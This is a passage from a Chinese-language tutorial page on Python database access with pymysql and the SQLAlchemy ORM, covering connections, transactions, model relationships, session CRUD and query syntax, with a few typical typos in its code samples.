    database='xing',
    charset='utf8'
)
# 获取一个光标
cursor = conn.cursor(cursor=pymysql.cursors.DictCursor)  # 返回字典数据类型

# 定义将要执行的sql语句
sql = 'select user,pwdfromuserinfo;'
# 拼接并执行sql语句
cursor.execute(sql)

# 取到查询结果
ret1 = cursor.fetchone()  # 取一条
# 可以获取指定数量的数据
ret2 = cursor.fetchmany(3)  # 取三条
ret3 = cursor.fetchone()  # 取一条

cursor.close()
conn.close()

print(ret1)
print(ret2)
print(ret3)　　

# 光标按绝对位置移动1
cursor.scroll(1, mode="absolute")
# 光标按照相对位置(当前位置)移动1
cursor.scroll(1, mode="relative")

</textarea>数据回滚<textarea>
import pymysql

# 建立连接
conn = pymysql.connect(
    host="192.168.0.103",
    port=3306,
    user="root",
    password="123",
    database="xing",
    charset="utf8"
)
# 获取一个光标
cursor = conn.cursor()
# 定义将要执行的SQL语句
sql1 = "insert into userinfo (user, pwd) values (%s, %s);"
sql2 = "insert into hobby (id, hobby) values (%s,%s);"
user = "july1"
pwd = "july1"
id = "我是错误的id"  #id = "3"
hobby = "打游戏"
try:
    # 拼接并执行SQL语句
    cursor.execute(sql1, [user, pwd])
    print(sql1)
    cursor.execute(sql2, [id, hobby])  # 报错的SQL语句
    # 涉及写操作注意要提交
    conn.commit()
except Exception as e:
    print(str(e))
    conn.rollback()  # 有异常就回滚

# 关闭连接
cursor.close()
conn.close()

</textarea>
</div>

<div id="sqlalchemy">
<h3>ORM框架 使用SQLAlchemy</h3><pre>
数据库表是一个包含多行多列的二维表,把表的内容用Python的数据结构表示出来的话,可以用一个list表示多行,list的每一个元素是tuple表示一行记录

</pre><textarea>
[
    ('1', 'Michael'),
    ('2', 'Bob'),
    ('3', 'Adam')
]

# 但是用tuple表示一行很难看出表的结构,如果把一个tuple用class实例来表示就可以更容易地看出表的结构来:
class User(object):
    def __init__(self, id, name):
        self.id = id
        self.name = name

[
    User('1', 'Michael'),
    User('2', 'Bob'),
    User('3', 'Adam')
]

</textarea><pre>
这就是ORM技术:Object-Relational Mapping,把关系数据库的表结构映射到对象上,ORM就是把数据库表的行与相应的对象建立关联,互相转换,把数据库表的一行记录与一个对象互相做自动转换,Python最有名的ORM框架是SQLAlchemy

ORM,对象关系映射,即Object Relational Mapping的简称,通过ORM框架将编程语言中的对象模型与数据库的关系模型建立映射关系,这样做的目的：简化sql语言操作数据库的繁琐过程(原生sql的编写及拼接等),转而直接使用对象模型来操作数据库做替代

SqlAlchemy本身无法直接操作数据库,它是建立在第三方数据库API之上如python中的pymysql库,应用程序调用对象模型进行增删改查等操作时,将对象转化成sql语句,然后再通过API调用执行已经转换好的sql语句

$ pip3 install sqlalchemy
$ pip3 install pymysql

>>> import sqlalchemy
>>> sqlalchemy.__version__
>>> print([e for e in dir(sqlalchemy) if not e.startswith('_')])
['ARRAY', 'BIGINT', 'BINARY', 'BLANK_SCHEMA', 'BLOB', 'BOOLEAN', 'BigInteger', 'Binary', 'Boolean', 'CHAR', 'CLOB', 'CheckConstraint', 'Column', 'ColumnDefault', 'Constraint', 'DATE', 'DATETIME', 'DDL', 'DECIMAL', 'Date', 'DateTime', 'DefaultClause', 'Enum', 'FLOAT', 'FetchedValue', 'Float', 'ForeignKey', 'ForeignKeyConstraint', 'INT', 'INTEGER', 'Index', 'Integer', 'Interval', 'JSON', 'LargeBinary', 'MetaData', 'NCHAR', 'NUMERIC', 'NVARCHAR', 'Numeric', 'PassiveDefault', 'PickleType', 'PrimaryKeyConstraint', 'REAL', 'SMALLINT', 'Sequence', 'SmallInteger', 'String', 'TEXT', 'TIME', 'TIMESTAMP', 'Table', 'Text', 'ThreadLocalMetaData', 'Time', 'TypeDecorator', 'Unicode', 'UnicodeText', 'UniqueConstraint', 'VARBINARY', 'VARCHAR', 'alias', 'all_', 'and_', 'any_', 'asc', 'between', 'bindparam', 'case', 'cast', 'collate', 'column', 'create_engine', 'delete', 'desc', 'dialects', 'distinct', 'engine', 'engine_from_config', 'event', 'events', 'exc', 'except_', 'except_all', 'exists', 'extract', 'false', 'func', 'funcfilter', 'insert', 'inspect', 'inspection', 'interfaces', 'intersect', 'intersect_all', 'join', 'lateral', 'literal', 'literal_column', 'log', 'modifier', 'not_', 'null', 'nullsfirst', 'nullslast', 'or_', 'outerjoin', 'outparam', 'over', 'pool', 'processors', 'schema', 'select', 'sql', 'subquery', 'table', 'tablesample', 'text', 'true', 'tuple_', 'type_coerce', 'types', 'union', 'union_all', 'update', 'util', 'within_group']

</pre>

<h4>连接与创建</h4><pre>
【 配置及创建数据库引擎 】
SqlAlchemy支持间接调用多种数据库API,根据不同的配置文件调用不同的数据库API
MySQL-Python：mysql+mysqldb://< user>:< password>@< host>[:< port>]/< dbname>
pymysql：mysql+pymysql://< username>:< password>@< host>/< dbname>[?< options>]
MySQL-Connector：mysql+mysqlconnector://< user>:< password>@< host>[:< port>]/< dbname>
cx_Oracle：oracle+cx_oracle://user:pass@host:port/dbname[?key=value&key=value...]

# 初始化数据库连接,使用mysql数据库,pymysql API与数据库交互,添加的charset可防止中文乱码
from sqlalchemy import create_engine
url = "mysql+pymysql://[账号]:[密码]@[主机]:[端口]/[数据库]?charset=utf8"
engine = create_engine(url,echo=False,encoding="utf-8")  #url为配置文件,echo调试参数,值为为true打印整个sql执行过程
engine = create_engine('sqlite:///:memory:', echo=True)

</pre><textarea>
from sqlalchemy import create_engine
engine = create_engine('mysql+pymysql://admin@127.0.0.1:3306/python?charset=utf8')
r = engine.execute('select * from user').fetchall()
print(r)

</textarea>

<h4>对象关系映射</h4><pre>
要使用ORM,需要将数据表的结构用ORM的语言描述出来。SQLAlchmey提供了一套Declarative系统来完成这个任务。
以创建一个users表为例,看看它是怎么用SQLAlchemy的语言来描述的

</pre><textarea>
from sqlalchemy import create_engine,Column,String,Text,Integer
from sqlalchemy.ext.declarative import declarative_base
Base = declarative_base()
engine = create_engine('mysql+pymysql://admin@localhost:3306/python?charset=utf8')

class User(Base):
    __tablename__ = 'users'
    id = Column(Integer,primary_key=True)
    username = Column(String(64),nullable=False,index=True)
    password = Column(String(64),nullable=False)
    email = Column(String(64),nullable=False,index=True)

    def __repr__(self):
        return '%s(%r)' % (self.__class__.__name__,self.username)

Base.metadata.create_all(engine)

print(User.__table__)  # users

</textarea><pre>
类中的每一个Column代表数据库中的一列,在Colunm中指定该列的一些配置。第一个字段代表类的数据类型,常用的包括String、Integer、Text、Boolean、SmallInteger、DateTime
nullable=False代表这一列不可以为空
index=True表示在该列创建索引

一对多关系
对于一个普通的博客应用来说,用户和文章显然是一个一对多的关系,一篇文章属于一个用户,一个用户可以写很多篇文章

</pre><textarea>
from sqlalchemy import ForeignKey
from sqlalchemy.orm import relationship
from sqlalchemy import Column, String, Integer, Text

class User(Base):
    __tablename__ = 'users'

    id = Column(Integer, primary_key=True)
    username = Column(String(64), nullable=False, index=True)
    password = Column(String(64), nullable=False)
    email = Column(String(64), nullable=False, index=True)
    articles = relationship('Article')

    def __repr__(self):
        return '%s(%r)' % (self.__class__.__name__, self.username)

class Article(Base):
    __tablename__ = 'articles'

    id = Column(Integer, primary_key=True)
    title = Column(String(255), nullable=False, index=True)
    content = Column(Text)
    user_id = Column(Integer, ForeignKey('users.id'))
    author = relationship('User')

    def __repr__(self):
        return '%s(%r)' % (self.__class__.__name__, self.title)

</textarea><pre>
每篇文章有一个外键指向users表中的主键id,而在User中使用SQLAlchemy提供的relationship描述关系。而用户与文章的之间的这个关系是双向的,所以上面的两张表中都定义了relationship。

创建的articles表有外键userid,在SQLAlchemy中可以使用ForeignKey设置外键。设置外键后,如果能够直接从articles的实例上访问到相应的users表中的记录会非常方便,而这可以通过relationship实现。上面的代码通过relationship定义了author属性,这样就可以直接通过articles.author获取相应的用户记录。

SQLAlchemy提供了backref让我们可以只需要定义一个关系：
articles = relationship('Article', backref='author')
添加了这个就可以不用再在Article中定义relationship了

一对一关系
在User中只定义了几个必须的字段,但通常用户还有很多其他信息,但这些信息可能不是必须填写的,可以把它们放到另一张UserInfo表中,这样User和UserInfo就形成了一对一的关系,一对一关系是基于一对多定义的

</pre><textarea>
class User(Base):
    __tablename__ = 'users'

    id = Column(Integer, primary_key=True)
    username = Column(String(64), nullable=False, index=True)
    password = Column(String(64), nullable=False)
    email = Column(String(64), nullable=False, index=True)
    articles = relationship('Article', backref='author')
    userinfo = relationship('UserInfo', backref='user', uselist=False)

    def __repr__(self):
        return '%s(%r)' % (self.__class__.__name__, self.username)

class UserInfo(Base):
    __tablename__ = 'userinfos'

    id = Column(Integer, primary_key=True)
    name = Column(String(64))
    qq = Column(String(11))
    phone = Column(String(11))
    link = Column(String(64))
    user_id = Column(Integer, ForeignKey('users.id'))

</textarea><pre>
定义方法和一对多相同,只是需要添加uselist=False
定义users属性时使用了relationship的backref参数,该参数使得可以在UserInfo实例中,通过userinfos.user访问关联的所有用户信息。

多对多关系
一遍博客通常有一个分类,好几个标签。标签与博客之间就是一个多对多的关系。多对多关系不能直接定义,需要分解成俩个一对多的关系,为此需要一张额外的表来协助完成,通常对于这种多对多关系的辅助表不会再去创建一个类,而是使用sqlalchemy的Table类

</pre><textarea>
# 在原来代码的基础上导入
from sqlalchemy import Table

article_tag = Table(
    # 第一个参数为表名称,第二个参数是metadata,这俩个是必须的,Base.metadata是sqlalchemy.schema.MetaData对象,表示所有Table对象集合,create_all()会触发CREATE TABLE语句创建所有的表。
    'article_tag', Base.metadata,
    # 对于辅助表,一般存储要关联的俩个表的id,并设置为外键
    # course_tag是双主键,双主键的目的就是为了约束避免出现重复的一对主键记录,大部分情况都是应用在这种多对多的中间表中。
    Column('article_id', Integer, ForeignKey('articles.id'), primary_key=True),
    Column('tag_id', Integer, ForeignKey('tags.id'), primary_key=True)
)

class Tag(Base):
    __tablename__ = 'tags'

    id = Column(Integer, primary_key=True)
    name = Column(String(64), nullable=False, index=True)
    articles = relationship('Articles', secondary=article_tag, backref='tages') # secondary指的是中间表,backref指向自己的这个表

    def __repr__(self):
        return '%s(%r)' % (self.__class__.__name__, self.name)

</textarea><pre>
映射到数据
表已经描述好了,在文件末尾使用下面的命令在连接的数据库中创建对应的表：
if __name__ == '__main__':
    Base.metadata.create_all(engine)

</pre>

<h4>session CURD</h4><pre>
session内部的实现都是调用engine的各种接口,相当于session是engine的一个封装,比如session.commit的时候会先调用engine.connect()去连接数据库,再调用执行sql相关的接口。
session.rollback()

【 通过SQLAlchemy建立一个会话(session)】
通过sessionmaker工厂方法得到一个类,默认返回Session类,也可以自定义Session类
sessionmaker(bind=None, class_=Session, autoflush=True,autocommit=False,expire_on_commit=True,info=None, **kw)

#示例1：直接调用sessionmaker
from sqlalchemy.orm import sessionmaker
SessionClass=sessionmaker(bind=engine) #利用工厂模式获取SessionClass
session_obj=SessionClass() #创建session对象,此时已绑定数据库引擎,但是未关联任何的对象模型

#示例2：使用scoped_session
from sqlalchemy.orm import scoped_session
SessionClass=scoped_session(sessionmaker(bind=engine))#利用工厂模式获取SessionClass
session_obj=SessionClass() #创建session对象,此时已绑定数据库引擎,但是未关联任何的对象模型

Session：多次创建的Session对象是不同的
scoped_session：首先通过sessionmaker工厂创建Session对象,然后对Session对象进行相应的管理(先在Registry中找之前是否创建过Session,若没有则创建并注册,有则直接返回),这样的目的是同一个线程维护一个session对象,保证了线程的安全性

【 Faker是用来生成虚假数据的库 】
pip install faker

</pre>完整代码<textarea>
from sqlalchemy import create_engine, Column, String, Text, Integer, ForeignKey, Table
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker,relationship

Base = declarative_base()

class User(Base):
    __tablename__ = 'users'

    id = Column(Integer, primary_key=True)
    username = Column(String(64), nullable=False, index=True)
    password = Column(String(64), nullable=False)
    email = Column(String(64), nullable=False, index=True)
    articles = relationship('Article', backref='author')
    userinfo = relationship('UserInfo', backref='user', uselist=False)

    def __repr__(self):
        return '%s(%r)' % (self.__class__.__name__, self.username)

class UserInfo(Base):
    __tablename__ = 'userinfos'

    id = Column(Integer, primary_key=True)
    name = Column(String(64))
    qq = Column(String(11))
    phone = Column(String(11))
    link = Column(String(64))
    user_id = Column(Integer, ForeignKey('users.id'))

class Article(Base):
    __tablename__ = 'articles'

    id = Column(Integer, primary_key=True)
    title = Column(String(64), nullable=False, index=True)
    content = Column(Text)
    user_id = Column(Integer, ForeignKey('users.id'))
    cate_id = Column(Integer, ForeignKey('categories.id'))
    tags = relationship('Tag', secondary='article_tag', backref='articles')

    def __repr__(self):
        return '%s(%r)' % (self.__class__.__name__, self.title)

class Category(Base):
    __tablename__ = 'categories'

    id = Column(Integer, primary_key=True)
    name = Column(String(64), nullable=False, index=True)
    articles = relationship('Article', backref='category')

    def __repr__(self):
        return '%s(%r)' % (self.__class__.__name__, self.name)

article_tag = Table(
    # 第一个参数为表名称,第二个参数是metadata,这俩个是必须的,Base.metadata是sqlalchemy.schema.MetaData对象,表示所有Table对象集合,create_all()会触发CREATE TABLE语句创建所有的表。
    'article_tag', Base.metadata,
    # 对于辅助表,一般存储要关联的俩个表的id,并设置为外键
    # course_tag是双主键,双主键的目的就是为了约束避免出现重复的一对主键记录,大部分情况都是应用在这种多对多的中间表中。
    Column('article_id', Integer, ForeignKey('articles.id'), primary_key=True),
    Column('tag_id', Integer, ForeignKey('tags.id'), primary_key=True)
)

class Tag(Base):
    __tablename__ = 'tags'

    id = Column(Integer, primary_key=True)
    name = Column(String(64), nullable=False, index=True)

    def __repr__(self):
        return '%s(%r)' % (self.__class__.__name__, self.name)

if __name__ == '__main__':
    # CREATE DATABASE sqlalchemy charset utf8mb4 COLLATE utf8mb4_unicode_ci;
    engine = create_engine('mysql+pymysql://admin@localhost:3306/sqlalchemy?charset=utf8')
    Base.metadata.create_all(engine) # 在连接的数据库中创建对应的表

    Session = sessionmaker(bind=engine)
    session = Session()

    import random
    from faker import Factory  # 导入faker工厂对象
    faker = Factory.create()   # 创建一个faker工厂对象

    faker_users = [User(
        username=faker.name(),  # 使用faker生成一个人名
        password=faker.word(),  # 使用faker生成一个单词
        email=faker.email(),    # 使用faker生成一个邮箱
    ) for i in range(10)]
    session.add_all(faker_users) # add_all一次性添加多个对象

    faker_categories = [Category(name=faker.word()) for i in range(5)] # 生成5个分类
    session.add_all(faker_categories)

    faker_tags= [Tag(name=faker.word()) for i in range(20)]  # 生成20个标签
    session.add_all(faker_tags)

    for i in range(100):                                                   # 生成100篇文章
        article = Article(
            title=faker.sentence(),                                        # sentence()生成一句话作为标题
            content=' '.join(faker.sentences(nb=random.randint(10, 20))),  # 文章内容为随机生成的10-20句话
            author=random.choice(faker_users),                             # 从生成的用户中随机取一个作为作者
            category=random.choice(faker_categories)                       # 从生成的分类中随机取一个作为分类
        )

        for tag in random.sample(faker_tags, random.randint(2, 5)):        # 从生成的标签中随机取2-5个作为分类
            article.tags.append(tag)
        session.add(article)

    session.commit()

</textarea><textarea>
>ipython
In [1]: %run "hello.py"
e:\wamp64\www\study\python\env\lib\site-packages\pymysql\cursors.py:170: Warning: (1366, "Incorrect string value: '\\xD6\\xD0\\xB9\\xFA\\xB1\\xEA...' for column 'VARIABLE_VALUE' at row 475")
  result = self._query(query)

In [2]: session
Out[2]: < sqlalchemy.orm.session.Session at 0x21431e6d448>

In [3]: session.query(User).get(1)
Out[3]: User('Crystal Francis')

In [4]: session.query(User).filter_by(username='Crystal Francis').first()
Out[4]: User('Crystal Francis')

In [5]: session.query(User).filter(User.username=='Crystal Francis').first()
Out[5]: User('Crystal Francis')

In [6]: session.query(User).all()[:3]
Out[6]:
[User('Crystal Francis'),
 User('James Villanueva'),
 User('Miranda Fitzpatrick')]

In [7]: a = session.query(Article).get(1)

In [8]: a.tags
Out[8]: [Tag('news'), Tag('stage'), Tag('international'), Tag('near'), Tag('rest')]

In [9]: a.category
Out[9]: Category('region')

In [10]: a.title
Out[10]: 'Item bill although term.'

In [11]: a
Out[11]: Article('Item bill although term.')

In [12]: a.title = 'my test blog title'

In [13]: session.add(a)

In [14]: session.commit()

In [15]: a.title
Out[15]: 'my test blog title'

In [16]: a.tags.append(Tag(name='python'))

In [17]: session.add(a)

In [18]: session.commit()

In [19]: session.delete(a)

In [20]: session.commit()

</textarea><pre>
【 与数据库交互: 增 】
session.add(object) #在数据库中增加一个对象实例
session.add_all([object]) #在数据库中增加多个对象实例,参数为列表形式
session.commit() #提交,否则未入库

obj1 = Users(name="张根",age=18,email='13220198866@163.com',extra='sss')
session.add(obj1)

session.add_all([
  Users(name="admin1",age=19,email='645172205@qq.com',extra='sss'),
  Users(name="admin2",age=20,email='13220198866@139.com',extra='sss')
])

【 与数据库交互: 改 】
session.query(object).filter(object.prop>20).update({"prop1": 'values'})#批量更新,若没有过滤条件则更新表中所有记录
myuser = Session.query(object).filter(object.prop>20).first()
object.prop2= 'value2' #单条更新,可直接修改对象
session.commit()

session.query(Users).filter(Users.id==4).update({'name':'Martin'})
session.query(Users).filter(Users.id==4).update({Users.name: Users.name + "666"}, synchronize_session=False)
session.query(Users).filter(Users.id==18).update({Users.id: Users.id - 12},synchronize_session="evaluate")

【 与数据库交互: 删 】
res = session.query(object).filter(object.prop>20).delete()
session.commit()

session.query(Users).filter(Users.id==5).delete()

【 与数据库交互: 查 】
# 以下均已object代表对象模型,object.prop代表对象object的prop属性
session.query(object) #查询object对应的关系表,相当于select * from tables
session.query(object).first() #查询结果取第一条,没有返回none
session.query(object).filter(object.prop) #条件查询,filter相当于where
session.query(object).order_by(object.prop) #排序,默认升序,降序用desc
session.query(object).order_by(object.prop.desc()).limit(10) #降序,及限制10条
session.query(object.prop.label("别名")).filter(object.prop.like("%同同mony")) #模糊查询及给字段取别名
# 使用聚合函数sum、count等
from sqlalchemy import func
session.query(func.sum(object.prop).label("别名")

for instance in session.query(User).order_by(User.id): print(instance.name, instance.fullname)
for name, fullname in session.query(User.name, User.fullname): print(name, fullname)
for row in session.query(User, User.name).all(): print(row.User, row.name)
for row in session.query(User.name.label('name_label')).all(): print(row.name_label)

基本查询
r0=session.query(Users).all()                             #查询user表中全部数据,all() returns a list
r1=session.query(Users).filter(Users.id > 2)              #查询user表中,id>2的记录;
r2=session.query(Users.age).all()                         #查询User表中的age列; ##[(18,), (19,)]
r3=session.query(Users.age.label('cname')).all()          #使用别名查询
r4=session.query(Users).filter(Users.name=='Martin').all()      #查询姓名==Martin的用户
r5=session.query(Users).filter_by(name='Martin',age=19).all()   #filter_by方式查询
r6=session.query(Users).filter_by(name='Martin',age=19).first() #获取单个对象
r6=session.query.filter(User.id == 99).one()
r6=session.query.filter(User.id == 99).one_or_none()
r6=session.query(User.id).filter(User.name == 'ed').order_by(User.id).scalar()

from sqlalchemy import text
r7=session.query(User).filter(text("id<224")).order_by(text("id")).all():
r7=session.query(Users).filter(text("id<:value and name=:name")).params(value=18, name='Martin').order_by(Users.id).all()
#from_statement,申请使用原生sql
r8 = session.query(Users).from_statement(text("SELECT * FROM users where name=:name")).params(name='ed').all()

>>> stmt = text("SELECT name, id, fullname, nickname FROM users where name=:name")
>>> stmt = stmt.columns(User.name, User.id, User.fullname, User.nickname)
>>> session.query(User).from_statement(stmt).params(name='ed').all()
[< User(name='ed', fullname='Ed Jones', nickname='eddie')>]

条件查询
ret0 = session.query.filter(User.name == 'ed')
ret0 = session.query.filter(User.name != 'ed')
ret0 = session.query.filter(User.name.like('%ed%'))
ret0 = session.query.filter(User.name.ilike('%ed%'))  # case-insensitive LIKE
query.filter(User.name == None)
query.filter(User.name.is_(None))
query.filter(User.name != None)
query.filter(User.name.isnot(None))

ret0 = session.query(Users).filter(Users.id.between(0,7), Users.name == 'Martin').all()
ret1 = session.query(Users).filter(Users.id.in_([1,6])).all()
ret2 = session.query(Users).filter(~Users.id.in_([1,3,4])).all()
for user in session.query(User).filter(User.name=='ed').filter(User.fullname=='Ed Jones'): print(user)
ret = session.query(Users).filter(Users.id.in_(session.query(Users.id).filter_by(name='Martin'))).all()

from sqlalchemy import tuple_
query.filter(tuple_(User.name, User.nickname).in_([('ed', 'edsnickname'), ('wendy', 'windy')]))

多查询条件、逻辑运算、嵌套查询
from sqlalchemy import and_, or_
ret0 = session.query(Users).filter(and_(Users.id > 3, Users.name == 'eric')).all()
ret0 = session.query(Users).filter(Users.id > 3, Users.name == 'eric').all()
ret0 = session.query(Users).filter(Users.id > 3).filter(Users.name == 'eric').all()

ret1 = session.query(Users).filter(or_(Users.id < 2, Users.name == 'eric')).all()
ret2 = session.query(Users).filter(
    or_(
        Users.id < 2,
        and_(Users.name == 'eric', Users.id > 3),
        Users.extra != ""
    )).all()

query.filter(User.name.match('wendy'))

字符串符、模糊匹配查询
ret0 = session.query(Users).filter(Users.name.like('M%')).first().name
ret1 = session.query(Users).filter(~Users.name.like('%r%')).first().name

限制(分页)
ret = session.query(Users)[0:2]

排序
ret0 = session.query(Users).order_by(Users.id.desc()).all()                 #根据id,由大到小排序(desc).
ret1 = session.query(Users).order_by(Users.id.asc(),Users.age.desc()).all() #根据id,由小到大排序(asc),如id相等则age由大到小排序

group_by分组查询和.having二次筛选
having的作用：例如查询公司中部门人数大于3人的部门,先按照部门分组,然后求人数,然后再having 大于3的
from sqlalchemy.sql import func
ret0 = session.query(Users).group_by(Users.age).all() #根据name字段进行分组
ret1 = session.query(     #使用name字段进行分组,求每组中 最大id 、最小id 、id 之和
    func.max(Users.id),
    func.sum(Users.id),
    func.min(Users.id)).group_by(Users.name).all()
ret2 = session.query(
    func.max(Users.id),
    func.sum(Users.id),
    func.min(Users.id)).group_by(Users.name).having(func.min(Users.id)>2).all() #对分组之后的数据进行having筛选

连表查询
ret = session.query(Users).join(Hobby,Users.id == Hobby.id, isouter=True).filter(Users.id >1) #2个没有外键关系的表做连表查询
ret = session.query(Person).join(Hobby).all()               #inin_join
ret = session.query(Person).join(Hobby, isouter=True).all() #left_join 调换位置 更换为 right_join

for u, a in session.query(User, Address).filter(User.id==Address.user_id).filter(Address.email_address=='jack@google.com').all():
    print(u)  # < User(name='jack', fullname='Jack Bean', nickname='gjffdd')>
    print(a)  # < Address(email_address='jack@google.com')>

session.query(User).join(Address).filter(Address.email_address=='jack@google.com').all()
[< User(name='jack', fullname='Jack Bean', nickname='gjffdd')>]

query.outerjoin(User.addresses)   # LEFT OUTER JOIN

组合
q1 = session.query(Users.name).filter(Users.id > 2)
q2 = session.query(Favor.caption).filter(Favor.nid < 2)
ret = q1.union(q2).all()

session.query(User).filter(User.name.like('%ed')).count()
from sqlalchemy import func
session.query(func.count(User.name), User.name).group_by(User.name).all()

# 原生SQL查询、添加
cursor = session.execute('select * from users')
result = cursor.fetchall()
cursor = session.execute('insert into users(name) values(:value)',params={"value":'wupeiqi'})
session.commit()
print(cursor.lastrowid)
session.close()

</pre><textarea>
# 导入SQLAlchemy,并初始化DBSession,完成每个表的class定义
from sqlalchemy import Column, String, create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.ext.declarative import declarative_base

# 创建对象的基类
Base = declarative_base()

# 定义User对象
class User(Base):
    # 表的名字
    __tablename__ = 'user'
    # 表的结构
    id = Column(String(20), primary_key=True) # String、Integer、Text、Boolean、SmallInteger、DateTime
    name = Column(String(20), nullable=False, index=True)

# 初始化数据库连接,SQLAlchemy用一个字符串表示连接信息:'数据库类型+数据库驱动名称://用户名:口令@机器地址:端口号/数据库名'
engine = create_engine('mysql+mysqlconnector://admin@localhost:3306/python')
DBSession = sessionmaker(bind=engine) # 创建DBSession类型
session = DBSession()                 # 创建session对象

# 向数据库表中添加一行记录,由于有了ORM,向数据库表中添加一行记录可以视为添加一个User对象
# 关键是获取session,然后把对象添加到session,最后提交并关闭,DBSession对象可视为当前数据库连接
user = User(id='5', name='Bob')      # 创建新User对象
session.add(user)                    # 添加到session
session.commit()                     # 提交即保存到数据库
session.close()                      # 关闭session

# 从数据库表中查询数据,有了ORM,查询出来的可以不再是tuple,而是User对象
user = session.query(User).filter(User.id=='5').one()
print('type:', type(user))           # type: < class '__main__.User'>
print('name:', user.name)            # name: Bob
session.close()                      # 关闭Session

</textarea>原生SQL<textarea>
from sqlalchemy import create_engine

conn_pool=create_engine( #创建sqlalchemy引擎
    "mysql+pymysql://admin@localhost:3306/python?charset=utf8",
    max_overflow=2, #超过连接池大小之后,允许最大扩展连接数;
    pool_size=5,   #连接池大小
    pool_timeout=30,#连接池如果没有连接了,最长等待时间
    pool_recycle=-1,#多久之后对连接池中连接进行一次回收
)

#单线程操作线程池
conn = conn_pool.raw_connection()  #从连接池中获取1个连接,开始连接
cursor = conn.cursor()
cursor.execute("select * from user")
result = cursor.fetchall()
print(result)
cursor.close()
conn.close()

# 多线程操作线程池
def task(arg):
    conn = conn_pool.raw_connection()
    cursor = conn.cursor()
    cursor.execute(
        #"select * from cmdb_worker_order"
        "select sleep(2)"
    )
    result = cursor.fetchall()
    cursor.close()
    conn.close()

for i in range(20):
    t = threading.Thread(target=task, args=(i,)) #5个线程 执行2秒 然后5个线程在去执行2秒
    t.start()

</textarea>创建、删除数据库单表<textarea>
import datetime
from sqlalchemy import create_engine, Column, Integer, String, Text, ForeignKey, DateTime, UniqueConstraint, Index
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker
Base = declarative_base()

class Users(Base):
    __tablename__ = 'users'                                 # 表名称
    id = Column(Integer, primary_key=True)                  # primary_key=True设置主键
    username = Column(String(32), index=True, nullable=False)   # index=True创建索引, nullable=False不为空。
    age = Column(Integer, default=18)                       # 数字字段
    password = Column(String(64),nullable=False)
    email = Column(String(32), unique=True)                 # 设置唯一索引
    ctime = Column(DateTime, default=datetime.datetime.now) # 设置默认值为当前时间(注意千万不要datetime.datetime.now()
    extra = Column(Text, nullable=True)                     # 文本内容字段
    __table_args__ = (
        # UniqueConstraint('id', 'username', name='uix_id_name'), # 设置联合唯一索引
        # Index('ix_id_name', 'username', 'extra'),               # 设置联合索引
    )

    def __repr__(self):
       return "< Users(username='%s')>" % (self.username,)

engine = create_engine(
    "mysql+pymysql://admin@localhost:3306/python?charset=utf8",
    max_overflow=0,   # 超过连接池大小外最多创建的连接
    pool_size=5,      # 连接池大小
    pool_timeout=30,  # 池中没有线程最多等待的时间,否则报错
    pool_recycle=-1   # 多久之后对线程池中的线程进行一次连接的回收(重置)
)

Base.metadata.create_all(engine) # 根据类创建数据库表,读取继承了Base类的所有表在数据库中进行创建

### 添加1条记录
Session = sessionmaker(bind=engine)
session = Session()      # 每次执行数据库操作时都需要创建一个会话
# 执行ORM操作
obj1 = Users(username="admin", password="admin", email="admin@example.com") # 创建Users对象=1行数据
session.add(obj1)         # 添加到表中
session.commit()          # 提交事务
session.close()           # 关闭session

Base.metadata.drop_all(engine)   # 根据类删除数据库表,读取继承了Base类的所有表在数据库中进行删除表

</textarea>由于关系数据库的多个表还可用外键实现一对多、多对多等关联,相应地ORM框架也可提供两个对象之间的一对多、多对多等功能<textarea>
import datetime
from sqlalchemy import create_engine
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy import Column, Integer, String, Text, ForeignKey, DateTime, UniqueConstraint, Index
from sqlalchemy.orm import relationship
Base = declarative_base()

### 一对多示例
# 一个User拥有多个Book,可以定义一对多关系,查询一个User对象时该对象的books属性将返回一个包含若干个Book对象的list
class User(Base):
    __tablename__ = 'user'
    id = Column(String(20), primary_key=True)
    name = Column(String(20))
    books = relationship('Book')  # 一对多
    # books = relationship('Book', backref='author') # 添加了这个就可以不用再在Book中定义relationship

class Book(Base):
    __tablename__ = 'book'
    id = Column(String(20), primary_key=True)
    name = Column(String(20))
    user_id = Column(String(20), ForeignKey('user.id'))  # "多"的一方的book表是通过外键关联到user表的
    author = relationship('User')   # 双向,方便直接从book的实例上访问到相应的 users 表中的记录

</textarea>基于relationship做一对多操作<textarea>
class Hobby(Base):
    __tablename__ = 'hobby'
    id = Column(Integer, primary_key=True)
    caption = Column(String(50), default='篮球')

class Person(Base):
    __tablename__ = 'person'
    nid = Column(Integer, primary_key=True)
    name = Column(String(32), index=True, nullable=True)
    hobby_id = Column(Integer, ForeignKey("hobby.id"))
    hobby = relationship("Hobby", backref='pers')  # 与生成表结构无关,仅用于查询方便

# relationship正向增加
person_obj=Person(name='Tony',hobby=Hobby(caption='any'))

# relationship反向增加
hobby_obj=Hobby(caption='人妖')
hobby_obj.pers=[Person(name='李渊'), Person(name='西门庆'),]
session.add(person_obj,hobby_obj)

# 连表方式1：指定字段获取
persons=session.query(Person.name, Hobby.caption.label('hobby_caption')).join(Hobby)
for row in persons: print(row.name,row.hobby_caption,)

# 连表方式2：获取所有字段
persons = session.query(Person, Hobby).join(Hobby)
for row in persons: print(row)  # 2个对象

#连表方式3：relationship连表查询
persons = session.query(Person).all()
for row in persons: print(row.name,row.hobby.caption)

hobby = relationship("Hobby", backref='pers')
Hobby：正向查询
backref：反向查询

# :查询喜欢姑娘的所有人
hobby_obj=session.query(Hobby).filter(Hobby.id==2).first()
print(hobby_obj.pers)

</textarea>基于relationship多对多操作<textarea>
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy import Column, Integer, String, ForeignKey, UniqueConstraint, Index
from sqlalchemy.orm import sessionmaker, relationship
from sqlalchemy import create_engine
from sqlalchemy.sql import text
from sqlalchemy.engine.result import ResultProxy
from SqlALchemy import models

# 相亲表多对多示例
class G2B(Base):
    __tablename__ = 'g2b'
    id = Column(Integer, primary_key=True, autoincrement=True)
    girl_id = Column(Integer, ForeignKey('girl.id'))
    boy_id = Column(Integer, ForeignKey('boy.id'))

class Girl(Base):
    __tablename__ = 'girl'
    id = Column(Integer, primary_key=True)
    name = Column(String(64), unique=True, nullable=False)
    boys = relationship('Boy', secondary='g2b', backref='girls')  # 与生成表结构无关,仅用于查询方便

class Boy(Base):
    __tablename__ = 'boy'
